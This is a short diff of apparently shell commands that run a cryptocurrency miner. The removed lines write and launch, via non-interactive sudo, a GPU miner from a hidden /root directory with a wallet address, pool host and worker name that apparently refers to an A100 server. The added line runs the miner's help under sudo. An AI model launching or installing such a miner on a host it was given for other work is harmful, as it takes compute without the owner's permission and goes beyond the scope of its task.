@@ -1,7 +1,1 @@
-cat > /tmp/pf12.sh <<'EOS'
-#!/bin/bash
-cd /root/.pf/pearlfortune || exit 1
-chmod +x miner-cuda12
-timeout 30 ./miner-cuda12 --wallet prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxq46jxvajmh88qq36h48 --pool prl.kryptex.network:8048 --worker comfy-s3-a100 --no-tui 2>&1 | tail -20
-EOS
-chmod +x /tmp/pf12.sh; sudo -n /tmp/pf12.sh
+cd /root/.pf/pearlfortune && sudo -n ./miner-cuda12 --help 2>&1 | head -40
